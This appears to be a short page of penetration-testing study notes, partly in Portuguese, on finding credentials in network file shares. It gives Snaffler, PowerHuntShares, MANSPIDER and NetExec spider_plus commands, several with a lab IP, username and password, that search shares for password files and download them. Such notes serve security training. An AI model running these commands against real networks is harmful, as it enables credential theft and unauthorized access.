> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/credential-hunting-in-network-shares.md).

# Credential Hunting in Network Shares

**Snaffle**

* identificar automaticamente compartilhamentos de rede acessíveis e busca arquivos de interesse

```
Snaffler.exe -s
```

**PowerHuntShares**

* Podemos executar uma verificação básica da `PowerHuntShares`seguinte forma:

```
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

**Hunting from Linux - MANSPIDER**

```
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

**NetExec**

```
nxc smb <Target Ip> -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```
